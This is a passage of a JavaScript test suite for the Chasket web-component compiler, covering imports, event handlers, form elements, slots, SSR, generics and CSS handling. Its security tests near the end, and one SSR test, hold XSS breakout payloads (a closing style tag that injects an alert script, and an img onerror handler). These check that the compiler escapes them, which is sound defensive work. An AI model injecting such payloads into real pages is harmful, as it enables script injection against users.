  const r = compile(src, 'my-app.csk');
  assertSuccess(r);
  assertContains(r.output, "import './polyfills\\.js'");
});

test('import: multiple imports are all emitted', () => {
  const src = `<script>
import { a } from "mod-a"
import { b } from "mod-b"
import c from "mod-c"
state x: number = 0
</script>
<template><div>{{x}}</div></template>`;
  const r = compile(src, 'my-app.csk');
  assertSuccess(r);
  assertContains(r.output, "import \\{ a \\} from 'mod-a'");
  assertContains(r.output, "import \\{ b \\} from 'mod-b'");
  assertContains(r.output, "import c from 'mod-c'");
});

test('import: no imports means no import block', () => {
  const src = `<script>
state x: number = 0
</script>
<template><div>{{x}}</div></template>`;
  const r = compile(src, 'my-app.csk');
  assertSuccess(r);
  // Output should start with Chasket banner comment then IIFE directly (no import statements)
  assert.ok(r.output.includes('Built with Chasket'), 'Has Chasket banner comment');
  assert.ok(!r.output.includes('import '), 'No import statements present');
});

console.log('✓ All import output tests passed');

// ============================================================
// :class ARRAY/STRING SYNTAX TESTS
// ============================================================
console.log('\n── :class Array/String Syntax Tests ──');

test(':class with object syntax still works', () => {
  const src = `<script>
state active: boolean = true
state highlight: boolean = false
</script>
<template><div :class="{ active: active, highlight: highlight }">test</div></template>`;
  const r = compile(src, 'my-app.csk');
  assertSuccess(r);
  assertContains(r.output, 'class=');
  assertContains(r.output, 'Array\\.isArray');
});

test(':class with array syntax compiles', () => {
  const src = `<script>
state active: boolean = true
</script>
<template><div :class="['base', active && 'active']">test</div></template>`;
  const r = compile(src, 'my-app.csk');
  assertSuccess(r);
  assertContains(r.output, 'class=');
  assertContains(r.output, 'Array\\.isArray');
});

test(':class with string expression compiles', () => {
  const src = `<script>
state cls: string = "red"
</script>
<template><div :class="cls">test</div></template>`;
  const r = compile(src, 'my-app.csk');
  assertSuccess(r);
  assertContains(r.output, 'class=');
});

console.log('✓ All :class syntax tests passed');

// ============================================================
// COMPONENT AUTO-IMPORT TESTS
// ============================================================
console.log('\n── Component Auto-Import Tests ──');

test('collectCustomElements: finds custom elements in template', () => {
  const nodes = parseTemplateNodes('<div><my-button>Click</my-button><span>text</span><x-icon /></div>');
  const tags = collectCustomElements(nodes);
  assert.ok(tags.has('my-button'));
  assert.ok(tags.has('x-icon'));
  assert.ok(!tags.has('div'));
  assert.ok(!tags.has('span'));
});

test('collectCustomElements: finds nested custom elements', () => {
  const nodes = parseTemplateNodes('<my-card><my-header>Title</my-header></my-card>');
  const tags = collectCustomElements(nodes);
  assert.ok(tags.has('my-card'));
  assert.ok(tags.has('my-header'));
});

test('resolveComponents: maps tags to file paths', () => {
  const tags = new Set(['my-button', 'my-card', 'unknown-tag']);
  const registry = { 'my-button': './my-button.js', 'my-card': './my-card.js' };
  const deps = resolveComponents(tags, registry);
  assert.strictEqual(deps.length, 2);
  assert.ok(deps.some(d => d.tag === 'my-button' && d.path === './my-button.js'));
  assert.ok(deps.some(d => d.tag === 'my-card' && d.path === './my-card.js'));
});

test('auto-import: injects side-effect import for child components', () => {
  const src = `<script>
state label: string = "hi"
</script>
<template><div><my-button>{{label}}</my-button></div></template>`;
  const registry = { 'my-button': './my-button.js', 'my-app': './my-app.js' };
  const r = compile(src, 'my-app.csk', { componentRegistry: registry });
  assertSuccess(r);
  assertContains(r.output, "import './my-button\\.js'");
  // Should NOT self-import
  assertNotContains(r.output, "import './my-app\\.js'");
});

test('auto-import: does not duplicate existing user import', () => {
  const src = `<script>
import "./my-button.js"
state label: string = "hi"
</script>
<template><div><my-button>{{label}}</my-button></div></template>`;
  const registry = { 'my-button': './my-button.js' };
  const r = compile(src, 'my-app.csk', { componentRegistry: registry });
  assertSuccess(r);
  // Should appear only once
  const matches = r.output.match(/import '\.\/my-button\.js'/g);
  assert.strictEqual(matches.length, 1, 'Should not duplicate import');
});

console.log('✓ All component auto-import tests passed');

// ============================================================
// EVENT HANDLER RESOLUTION TESTS
// ============================================================
console.log('\n── Event Handler Resolution Tests ──');

test('event handler: fn name is called with (e) argument', () => {
  const src = `<script>
fn handleClick() { console.log("clicked") }
</script>
<template><button @click="handleClick">test</button></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
  assertContains(r.output, 'this.#handleClick\\(e\\)');
});

test('event handler: state variable as handler calls with typeof check', () => {
  const src = `<script>
state handler: object = {}
</script>
<template><button @click="handler">test</button></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
  assertContains(r.output, "typeof this.#handler === 'function'");
});

test('event handler: expressions with (e) work', () => {
  const src = `<script>
fn handleInput(e: InputEvent) { console.log(e.target) }
</script>
<template><input @input="handleInput(e)" /></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
  assertContains(r.output, 'handleInput');
});

test('event handler: checkVars validates identifiers in handler expressions', () => {
  const src = `<script>
state count: number = 0
</script>
<template><button @click="undefinedFn(count)">test</button></template>`;
  const r = compile(src, 'x-test.csk');
  assertFail(r);
  assert.ok(r.diagnostics.some(d => d.code === 'E0301'));
});

test('single-line fn: two single-line fns are both parsed', () => {
  const src = `<script>
fn a() { console.log("a") }
fn b() { console.log("b") }
</script>
<template><button @click="a" @mouseenter="b">test</button></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
  assertContains(r.output, 'this.#a\\(e\\)');
  assertContains(r.output, 'this.#b\\(e\\)');
});

console.log('✓ All event handler resolution tests passed');

// ============================================================
// Form-Associated Custom Elements
// ============================================================

test('form: true generates static formAssociated and internals', () => {
  const src = `<meta>
name: x-input
form: true
</meta>
<script>
state val: string = ""
</script>
<template><input :value="val" /></template>`;
  const r = compile(src, 'Input.csk');
  assertSuccess(r);
  assertContains(r.output, 'static formAssociated = true');
  assertContains(r.output, '#internals');
  assertContains(r.output, 'this.attachInternals()');
});

test('form: true generates form lifecycle callbacks', () => {
  const src = `<meta>
name: x-input
form: true
</meta>
<script>
state val: string = ""
</script>
<template><input :value="val" /></template>`;
  const r = compile(src, 'Input.csk');
  assertSuccess(r);
  assertContains(r.output, 'formAssociatedCallback');
  assertContains(r.output, 'formDisabledCallback');
  assertContains(r.output, 'formResetCallback');
  assertContains(r.output, 'formStateRestoreCallback');
});

test('form: true generates public form API methods', () => {
  const src = `<meta>
name: x-input
form: true
</meta>
<template><input /></template>`;
  const r = compile(src, 'Input.csk');
  assertSuccess(r);
  assertContains(r.output, 'get form()');
  assertContains(r.output, 'get validity()');
  assertContains(r.output, 'get validationMessage()');
  assertContains(r.output, 'get willValidate()');
  assertContains(r.output, 'checkValidity()');
  assertContains(r.output, 'reportValidity()');
});

test('form: true with setFormValue in script', () => {
  const src = `<meta>
name: x-input
form: true
</meta>
<script>
state val: string = ""
fn handleInput(e: InputEvent) {
  val = e.target.value
  setFormValue(val)
}
</script>
<template><input @input="handleInput" /></template>`;
  const r = compile(src, 'Input.csk');
  assertSuccess(r);
  assertContains(r.output, 'this.#setFormValue');
});

test('form: true with setValidity in script', () => {
  const src = `<meta>
name: x-input
form: true
</meta>
<script>
state val: string = ""
fn validate() {
  if (val.length === 0) {
    setValidity({ valueMissing: true }, "Value is required")
  } else {
    setValidity({})
  }
}
</script>
<template><input :value="val" /></template>`;
  const r = compile(src, 'Input.csk');
  assertSuccess(r);
  assertContains(r.output, 'this.#setValidity');
});

test('form: true with on formReset lifecycle', () => {
  const src = `<meta>
name: x-input
form: true
</meta>
<script>
state val: string = "default"
on formReset {
  val = "default"
}
</script>
<template><input :value="val" /></template>`;
  const r = compile(src, 'Input.csk');
  assertSuccess(r);
  assertContains(r.output, 'formResetCallback');
  // The body should contain the reset logic
  const resetIdx = r.output.indexOf('formResetCallback');
  const resetBody = r.output.substring(resetIdx, resetIdx + 200);
  assert.ok(resetBody.includes('#val'), 'formReset body should reference state');
});

test('form: false (default) does not generate form internals', () => {
  const src = `<meta>
name: x-normal
</meta>
<template><div>hello</div></template>`;
  const r = compile(src, 'Normal.csk');
  assertSuccess(r);
  assert.ok(!r.output.includes('formAssociated'), 'should not have formAssociated');
  assert.ok(!r.output.includes('#internals'), 'should not have internals');
  assert.ok(!r.output.includes('attachInternals'), 'should not have attachInternals');
});

console.log('✓ All form-associated tests passed');

// ============================================================
// Slot Support
// ============================================================

test('slot: default slot renders in template', () => {
  const src = `<meta>
name: x-card
</meta>
<template>
  <div class="card"><slot></slot></div>
</template>`;
  const r = compile(src, 'Card.csk');
  assertSuccess(r);
  assertContains(r.output, '<slot>');
});

test('slot: named slots render correctly', () => {
  const src = `<meta>
name: x-layout
</meta>
<template>
  <header><slot name="header"></slot></header>
  <main><slot></slot></main>
  <footer><slot name="footer"></slot></footer>
</template>`;
  const r = compile(src, 'Layout.csk');
  assertSuccess(r);
  assertContains(r.output, 'name="header"');
  assertContains(r.output, 'name="footer"');
});

test('slot: fallback content in slot', () => {
  const src = `<meta>
name: x-panel
</meta>
<template>
  <div><slot>Default Content</slot></div>
</template>`;
  const r = compile(src, 'Panel.csk');
  assertSuccess(r);
  assertContains(r.output, 'Default Content');
});

test('slot: ::slotted CSS passes through', () => {
  const src = `<meta>
name: x-card
</meta>
<template><slot></slot></template>
<style>
::slotted(p) { color: red; }
::slotted(*) { margin: 0; }
</style>`;
  const r = compile(src, 'Card.csk');
  assertSuccess(r);
  assertContains(r.output, '::slotted');
});

test('slot: :host CSS compiles correctly', () => {
  const src = `<meta>
name: x-box
</meta>
<template><slot></slot></template>
<style>
:host { display: block; padding: 16px; }
:host(.active) { border: 2px solid blue; }
:host(:hover) { background: #f0f0f0; }
</style>`;
  const r = compile(src, 'Box.csk');
  assertSuccess(r);
  assertContains(r.output, ':host');
});

console.log('✓ All slot support tests passed');

// ============================================================
// SSR (Server-Side Rendering)
// ============================================================

const { renderToString } = require('../lib/compiler');

test('SSR: basic renderToString with state', () => {
  const src = `<meta>
name: x-greeting
</meta>
<script>
state name: string = "World"
</script>
<template>
  <h1>Hello, {{ name }}!</h1>
</template>`;
  const r = renderToString(src, 'Greeting.csk');
  assert.ok(r.success);
  assert.equal(r.tagName, 'x-greeting');
  assert.ok(r.html.includes('Hello, World!'));
  assert.ok(r.html.includes('<template shadowrootmode="open">'));
});

test('SSR: prop override via props argument', () => {
  const src = `<meta>
name: x-card
</meta>
<script>
prop title: string = "Default"
</script>
<template><h2>{{ title }}</h2></template>`;
  const r = renderToString(src, 'Card.csk', { title: 'Custom' });
  assert.ok(r.html.includes('Custom'));
  assert.ok(r.html.includes('title="Custom"'));
});

test('SSR: style is minified and included', () => {
  const src = `<meta>
name: x-styled
</meta>
<template><p>hello</p></template>
<style>
p {
  color: blue;
  font-size: 16px;
}
</style>`;
  const r = renderToString(src, 'Styled.csk');
  assert.ok(r.html.includes('<style>'));
  assert.ok(r.css.includes('color'));
  // Should be minified (no excessive whitespace)
  assert.ok(!r.css.includes('  '));
});

test('SSR: #if conditional rendering', () => {
  const src = `<meta>
name: x-cond
</meta>
<script>
state visible: boolean = true
</script>
<template>
  <#if condition="visible">
    <p>shown</p>
  <:else>
    <p>hidden</p>
  </#if>
</template>`;
  const r = renderToString(src, 'Cond.csk');
  assert.ok(r.html.includes('shown'));
  assert.ok(!r.html.includes('hidden'));
});

test('SSR: #for loop rendering', () => {
  const src = `<meta>
name: x-list
</meta>
<script>
state items: string[] = ["A", "B", "C"]
</script>
<template>
  <ul>
    <#for each="item" of="items" key="item">
      <li>{{ item }}</li>
    </#for>
  </ul>
</template>`;
  const r = renderToString(src, 'List.csk');
  assert.ok(r.html.includes('<li>A</li>'));
  assert.ok(r.html.includes('<li>B</li>'));
  assert.ok(r.html.includes('<li>C</li>'));
});

test('SSR: shadow: none renders without template tag', () => {
  const src = `<meta>
name: x-inline
shadow: none
</meta>
<template><span>inline</span></template>`;
  const r = renderToString(src, 'Inline.csk');
  assert.ok(!r.html.includes('shadowrootmode'));
  assert.ok(r.html.includes('<span>inline</span>'));
});

test('SSR: HTML entities are escaped', () => {
  const src = `<meta>
name: x-safe
</meta>
<script>
state text: string = "<script>alert('xss')</script>"
</script>
<template><p>{{ text }}</p></template>`;
  const r = renderToString(src, 'Safe.csk');
  assert.ok(!r.html.includes('<script>alert'));
  assert.ok(r.html.includes('&lt;script&gt;'));
});

test('SSR: slot elements pass through', () => {
  const src = `<meta>
name: x-wrapper
</meta>
<template><div><slot></slot></div></template>`;
  const r = renderToString(src, 'Wrapper.csk');
  assert.ok(r.html.includes('<slot></slot>'));
});

console.log('✓ All SSR tests passed');

// ============================================================
// Const/Let Declarations
// ============================================================

test('const: compiles to private field', () => {
  const src = `<meta>
name: x-test
</meta>
<script>
const MAX_COUNT = 100
</script>
<template><p>{{ MAX_COUNT }}</p></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
  assertContains(r.output, '#MAX_COUNT = 100');
  assertContains(r.output, 'this.#MAX_COUNT');
});

test('let: compiles to private field', () => {
  const src = `<meta>
name: x-test
</meta>
<script>
let counter = 0
fn increment() {
  counter += 1
}
</script>
<template><p>{{ counter }}</p></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
  assertContains(r.output, '#counter = 0');
  assertContains(r.output, 'this.#counter');
});

test('const: with type annotation', () => {
  const src = `<meta>
name: x-test
</meta>
<script>
const API_URL: string = "https://api.example.com"
state data: string = ""
</script>
<template><p>{{ data }}</p></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
  assertContains(r.output, '#API_URL');
});

test('const: usable in event handler', () => {
  const src = `<meta>
name: x-test
</meta>
<script>
const handler = () => console.log("click")
</script>
<template><button @click="handler">test</button></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
  assertContains(r.output, 'this.#handler');
});

test('const: passes type checker', () => {
  const src = `<meta>
name: x-test
</meta>
<script>
const EVENT_MAP = { CLICK: "click", HOVER: "hover" }
fn handleEvent() {
  console.log(EVENT_MAP.CLICK)
}
</script>
<template><button @click="handleEvent">test</button></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
});

// ============================================================
// Import Path Rewriting
// ============================================================

test('import: .ts extension rewritten to .js', () => {
  const src = `<meta>
name: x-test
</meta>
<script>
import Utils from "./lib/utils.ts"
</script>
<template><p>hello</p></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
  assertContains(r.output, './lib/utils.js');
  assert.ok(!r.output.includes('./lib/utils.ts'));
});

test('import: .csk extension rewritten to .js', () => {
  const src = `<meta>
name: x-test
</meta>
<script>
import "./components/Button.csk"
</script>
<template><p>hello</p></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
  assertContains(r.output, './components/Button.js');
});

test('import: non-ts path unchanged', () => {
  const src = `<meta>
name: x-test
</meta>
<script>
import lodash from "lodash"
</script>
<template><p>hello</p></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
  assertContains(r.output, "from 'lodash'");
});

console.log('✓ All const/let and import tests passed');

// ============================================================
// Generic Type Support Tests
// ============================================================

test('generic: parseType handles Array<string>', () => {
  const { compile } = require('../lib/compiler');
  const src = `<meta>
name: x-test
</meta>
<script>
state items: Array<string> = []
</script>
<template><p>{{ items }}</p></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
});

test('generic: parseType handles Map<string, number>', () => {
  const src = `<meta>
name: x-test
</meta>
<script>
state scores: Map<string, number> = new Map()
</script>
<template><p>{{ scores }}</p></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
});

test('generic: parseType handles Promise<string>', () => {
  const src = `<meta>
name: x-test
</meta>
<script>
state result: Promise<string> = Promise.resolve("")
</script>
<template><p>{{ result }}</p></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
});

test('generic: nested generics Array<Map<string, number>>', () => {
  const src = `<meta>
name: x-test
</meta>
<script>
state data: Array<Map<string, number>> = []
</script>
<template><p>{{ data }}</p></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
});

test('generic: meta block generic parameter', () => {
  const src = `<meta>
name: x-list
generic: T
</meta>
<script>
state items: T[] = []
</script>
<template><p>{{ items }}</p></template>`;
  const r = compile(src, 'x-list.csk');
  assertSuccess(r);
});

test('generic: meta block generic with constraint', () => {
  const src = `<meta>
name: x-list
generic: T extends string
</meta>
<script>
state value: T = ""
</script>
<template><p>{{ value }}</p></template>`;
  const r = compile(src, 'x-list.csk');
  assertSuccess(r);
});

test('generic: multiple generic parameters', () => {
  const src = `<meta>
name: x-pair
generic: K, V
</meta>
<script>
state key: K = null
state val: V = null
</script>
<template><p>{{ key }}: {{ val }}</p></template>`;
  const r = compile(src, 'x-pair.csk');
  assertSuccess(r);
});

test('generic: .d.ts output includes generic params (ts target)', () => {
  const src = `<meta>
name: x-box
generic: T extends string
</meta>
<script>
prop content: T = ""
</script>
<template><p>{{ content }}</p></template>`;
  const r = compile(src, 'x-box.csk', { target: 'ts' });
  assertSuccess(r);
  assert.ok(r.dtsOutput, 'should have dtsOutput');
  assertContains(r.dtsOutput, '<T extends string>');
  assertContains(r.dtsOutput, 'XBox');
});

test('generic: typeToTs outputs correct generic string', () => {
  // Test via the compile output with TS target
  const src = `<meta>
name: x-test
</meta>
<script>
state items: Array<string> = []
state map: Map<string, number> = new Map()
</script>
<template><p>{{ items }}</p></template>`;
  const r = compile(src, 'x-test.csk', { target: 'ts' });
  assertSuccess(r);
  assertContains(r.output, 'Array<string>');
  assertContains(r.output, 'Map<string, number>');
});

test('generic: union with generic does not break', () => {
  const src = `<meta>
name: x-test
</meta>
<script>
state data: Array<string> | null = null
</script>
<template><p>{{ data }}</p></template>`;
  const r = compile(src, 'x-test.csk');
  assertSuccess(r);
});

console.log('✓ All generic type tests passed');

// ── Error Boundary Tests ──

test('compile - on error lifecycle hook generates #handleError method', () => {
  const src = `
<meta>
name: x-err
</meta>
<script>
state count: number = 0

fn doError() {
  throw new Error("test error")
}

on error {
  console.log("caught:", error.message)
}
</script>
<template><p>{{ count }}</p></template>`;
  const r = compile(src, 'x-err.csk');
  assertSuccess(r);
  assert.ok(r.output.includes('#handleError'), 'should have #handleError method');
  assert.ok(r.output.includes('try {'), 'should have try-catch in connectedCallback');
  assert.ok(r.output.includes('Component error'), 'should have error fallback UI');
});

test('compile - component without on error has no error boundary', () => {
  const src = `
<meta>
name: x-no-err
</meta>
<script>
state count: number = 0
</script>
<template><p>{{ count }}</p></template>`;
  const r = compile(src, 'x-no-err.csk');
  assertSuccess(r);
  assert.ok(!r.output.includes('#handleError'), 'should not have #handleError method');
});

console.log('✓ All error boundary tests passed');

// ─── Multi-line computed tests ───

test('compile - multi-line computed expression with arrow function body', () => {
  const src = `
<meta>
name: x-multi-computed
</meta>
<script>
state items: string[] = ["a", "b", "c"]
state filter: string = "all"

computed filtered: string[] = items.filter(item => {
  if (filter === "active") return item !== "b"
  return true
})
</script>
<template><p>{{ filtered.length }}</p></template>`;
  const r = compile(src, 'x-multi-computed.csk');
  assertSuccess(r);
  // The getter should contain the multi-line filter expression
  assert.ok(r.output.includes('.filter(item =>'), 'should have .filter(item => ...) not .this.#filter');
  assert.ok(!r.output.includes('.this.#filter'), 'should not replace .filter() as state variable');
  // Brace balance check
  let depth = 0;
  for (const ch of r.output) { if (ch === '{') depth++; if (ch === '}') depth--; }
  assert.strictEqual(depth, 0, 'braces should be balanced');
});

test('compile - state variable name collision with JS method does not corrupt method calls', () => {
  const src = `
<meta>
name: x-name-collision
</meta>
<script>
state filter: string = "all"
state items: string[] = []

computed active: string[] = items.filter(i => i !== "done")
</script>
<template><p>{{ filter }} {{ active.length }}</p></template>`;
  const r = compile(src, 'x-name-collision.csk');
  assertSuccess(r);
  // items.filter() should remain as method call
  assert.ok(r.output.includes('.filter(i =>'), 'should keep .filter() as method call');
  // standalone "filter" references should be replaced
  assert.ok(r.output.includes('this.#filter'), 'should replace standalone filter with this.#filter');
});

console.log('✓ All multi-line computed tests passed');

// =====================================================================
// scopeCss: CSS comment before @media should not break scoping
// =====================================================================
test('compile - scopeCss: CSS comment before @media does not break scoping', () => {
  const src = `
<meta>
name: x-comment-media
shadow: none
</meta>
<script>
state count: number = 0
</script>
<template><p>{{ count }}</p></template>
<style>
.box { color: red; }
/* Responsive */
@media (max-width: 768px) {
  .box { color: blue; }
}
</style>`;
  const r = compile(src, 'x-comment-media.csk');
  assertSuccess(r);
  // @media should appear in output and not be prefixed with scope selector
  assert.ok(r.output.includes('@media'), 'should contain @media rule');
  assert.ok(!r.output.match(/\[data-chasket-scope[^\]]*\]\s*\/\*.*\*\/\s*@media/),
    'scope selector should not appear before /* comment */ @media');
  // scoped .box should exist inside @media
  assert.ok(r.output.includes('[data-chasket-scope="x-comment-media"] .box'),
    'should scope .box selector');
});

// =====================================================================
// data-chasket-id includes component name to avoid collision
// =====================================================================
test('compile - data-chasket-id includes component name for namespace isolation', () => {
  const src = `
<meta>
name: x-id-ns
</meta>
<script>
fn handleClick() { }
</script>
<template><button @click="handleClick">Click</button></template>`;
  const r = compile(src, 'x-id-ns.csk');
  assertSuccess(r);
  // data-chasket-id should include the component name
  assert.ok(r.output.includes('data-chasket-id="fl-x-id-ns-0"'),
    'data-chasket-id should be namespaced with component name');
  assert.ok(!r.output.includes('data-chasket-id="fl-0"'),
    'should not use non-namespaced fl-0 format');
});

test('compile - different components produce different data-chasket-id namespaces', () => {
  const src1 = `
<meta>name: x-parent</meta>
<script>fn click1() { }</script>
<template><button @click="click1">A</button></template>`;
  const src2 = `
<meta>name: x-child</meta>
<script>fn click2() { }</script>
<template><button @click="click2">B</button></template>`;
  const r1 = compile(src1, 'x-parent.csk');
  const r2 = compile(src2, 'x-child.csk');
  assertSuccess(r1);
  assertSuccess(r2);
  assert.ok(r1.output.includes('fl-x-parent-0'), 'parent should use fl-x-parent-0');
  assert.ok(r2.output.includes('fl-x-child-0'), 'child should use fl-x-child-0');
  // They should NOT have the same ID
  assert.ok(!r1.output.includes('fl-x-child-'), 'parent should not have child namespace');
});

// =====================================================================
// adoptedStyleSheets: Shadow DOM components use CSSStyleSheet
// =====================================================================
test('compile - Shadow DOM component generates adoptedStyleSheets support', () => {
  const src = `
<meta>
name: x-adopted
</meta>
<script>
state count: number = 0
</script>
<template><p>{{ count }}</p></template>
<style>p { color: red; }</style>`;
  const r = compile(src, 'x-adopted.csk');
  assertSuccess(r);
  // Should have static #__css and #__sheet fields
  assert.ok(r.output.includes('static #__css'), 'should have static #__css field');
  assert.ok(r.output.includes('static #__sheet'), 'should have static #__sheet field');
  assert.ok(r.output.includes('CSSStyleSheet'), 'should reference CSSStyleSheet constructor');
  assert.ok(r.output.includes('replaceSync'), 'should call replaceSync with CSS');
  // Should adopt the sheet in constructor
  assert.ok(r.output.includes('adoptedStyleSheets'), 'should set adoptedStyleSheets in constructor');
  // Template should use conditional <style> fallback
  assert.ok(r.output.includes('#__sheet'), 'should reference #__sheet for conditional rendering');
});

test('compile - shadow:none component uses document.adoptedStyleSheets with ref counting', () => {
  const src = `
<meta>
name: x-no-adopt
shadow: none
</meta>
<script>
state count: number = 0
</script>
<template><p>{{ count }}</p></template>
<style>p { color: blue; }</style>`;
  const r = compile(src, 'x-no-adopt.csk');
  assertSuccess(r);
  // Should use adoptedStyleSheets on document (CSP-safe)
  assert.ok(r.output.includes('document.adoptedStyleSheets'), 'shadow:none should use document.adoptedStyleSheets');
  assert.ok(r.output.includes('static #__sheet'), 'shadow:none should have #__sheet');
  assert.ok(r.output.includes('#__sheetRefCount'), 'shadow:none should have ref counting');
  // Should have scoping attribute for CSS isolation
  assert.ok(r.output.includes('data-chasket-scope'), 'should have data-chasket-scope scoping');
  // <style> tag should only appear as fallback (when #__sheet is null)
  assert.ok(r.output.includes("#__sheet ? '' : '<style>'"), 'should use <style> only as fallback');
});

test('compile - shadow:none disconnectedCallback removes sheet from document', () => {
  const src = `
<meta>
name: x-cleanup
shadow: none
</meta>
<script>
state v: number = 0
</script>
<template><p>{{ v }}</p></template>
<style>p { color: red; }</style>`;
  const r = compile(src, 'x-cleanup.csk');
  assertSuccess(r);
  // disconnectedCallback should filter the sheet out of document.adoptedStyleSheets
  assert.ok(r.output.includes('document.adoptedStyleSheets.filter'), 'should clean up sheet on disconnect');
  assert.ok(r.output.includes('--'), 'should decrement ref count');
});

test('compile - component without <style> does not generate adoptedStyleSheets', () => {
  const src = `
<meta>
name: x-no-style
</meta>
<script>
state count: number = 0
</script>
<template><p>{{ count }}</p></template>`;
  const r = compile(src, 'x-no-style.csk');
  assertSuccess(r);
  assert.ok(!r.output.includes('static #__css'), 'should not have #__css without <style>');
  assert.ok(!r.output.includes('adoptedStyleSheets'), 'should not have adoptedStyleSheets without <style>');
});

// =====================================================================
// watch block: const declarations should NOT be promoted to class fields
// =====================================================================
test('compile - watch block const declarations stay local (not promoted to class fields)', () => {
  const src = `
<meta>name: x-watch-local</meta>
<script>
state activeSection: string = "intro"

watch activeSection {
  const links = document.querySelectorAll('.toc a')
  links.forEach((link) => {
    link.classList.remove('active')
  })
}
</script>
<template><p>{{ activeSection }}</p></template>`;
  const r = compile(src, 'x-watch-local.csk');
  assertSuccess(r);
  // const links should be inside the watch method, not promoted to a class field
  assert.ok(r.output.includes('#watch_activeSection'), 'should generate watch method');
  assert.ok(!r.output.match(/^\s+#links\s*=/m), 'const links should NOT be a class field');
  // Should contain const links inside the watch method body
  const watchIdx = r.output.indexOf('#watch_activeSection');
  const watchBody = r.output.substring(watchIdx, watchIdx + 300);
  assert.ok(watchBody.includes('const links'), 'const links should be inside watch method body');
});

test('compile - watch without parentheses syntax parses correctly', () => {
  const src = `
<meta>name: x-watch-noparen</meta>
<script>
state count: number = 0

watch count {
  console.log("count changed")
}
</script>
<template><p>{{ count }}</p></template>`;
  const r = compile(src, 'x-watch-noparen.csk');
  assertSuccess(r);
  assert.ok(r.output.includes('#watch_count'), 'should generate watch_count method');
  assert.ok(r.output.includes('__prev_count'), 'should track previous value for watch dep');
});

// ============================================================
// SECURITY TESTS: adoptedStyleSheets & CSS injection
// ============================================================

test('SEC-05-1: CSS containing close-style tag is escaped in generated output', () => {
  // Test code generation directly to bypass Phase 1 block splitting (which splits on </style>)
  // This tests that generate() properly escapes </style> in the CSS static field
  const maliciousCss = 'div{content:"<' + '/style><' + 'script>alert(1)<' + '/script>";}';
  const ast = {
    meta: { name: 'x-sec-style', shadow: 'open' },
    script: [{ kind: 'state', name: 'v', type: 'number', init: '0' }],
    template: [{ type: 'element', tag: 'div', attrs: [], children: [{ type: 'text', value: 'test' }] }],
    style: maliciousCss
  };
  const r = generate(ast, {});
  // The literal </style> and </script> must be escaped in #__css
  assert.ok(!r.output.includes('<' + '/style><' + 'script>'), 'must not contain unescaped close-style breakout');
  // In the generated JS template literal, </style> becomes <\/style>
  assert.ok(r.output.includes('<\\/style>'), 'closing style tag must be escaped');
  assert.ok(r.output.includes('<\\/script>'), 'closing script tag must be escaped');
});

test('SEC-05-2: CSS containing </script> is escaped in generated output', () => {
  const src = `<meta>name: x-sec-script</meta>
<script>state v: number = 0</script>
<template><div>{{v}}</div></template>
<style>
div { content: "</script>"; }
</style>`;
  const r = compile(src, 'x-sec-script.csk');
  assertSuccess(r);
  assert.ok(!r.output.includes('</script>"'), 'must not contain unescaped </script>');
});

test('SEC-05-3: shadow:none adoptedStyleSheets is idempotent (has instance flag)', () => {
  const src = `<meta>
name: x-idempotent
shadow: none
</meta>
<script>state v: number = 0</script>
<template><div>{{v}}</div></template>
<style>div { color: green; }</style>`;
  const r = compile(src, 'x-idempotent.csk');
  assertSuccess(r);
  assert.ok(r.output.includes('#__sheetAttached'), 'should have instance-level sheet tracking flag');
  // connectedCallback should check the flag before incrementing refcount
  assert.ok(r.output.includes('!this.#__sheetAttached'), 'should guard against double-connect');
});

test('SEC-05-4: SSR output escapes </style> in CSS', () => {
  const { renderToString } = require('./compiler.test.js').exports || compile;
  // Test via compile with SSR-like inspection
  const src = `<meta>name: x-ssr-sec</meta>
<script>state v: number = 0</script>
<template><div>{{v}}</div></template>
<style>div { content: "</style><img onerror=alert(1)>"; }</style>`;
  const r = compile(src, 'x-ssr-sec.csk');
  assertSuccess(r);
  // Even in the static #__css field, </style> must be escaped
  assert.ok(!r.output.includes('</style><img'), 'SSR-safe: must escape </style> in CSS string');
});

test('SEC-05-5: nextEid sanitizes component name for defense-in-depth', () => {
  // Normal component name should work as-is (already validated by E0003)
  const src = `<meta>name: x-safe-comp</meta>
<script>state v: number = 0</script>
<template><div @click="v++">{{v}}</div></template>`;
  const r = compile(src, 'x-safe-comp.csk');
  assertSuccess(r);
  // Event binding ID should include the component name
  assert.ok(r.output.includes('fl-x-safe-comp-'), 'element ID includes component name');
});
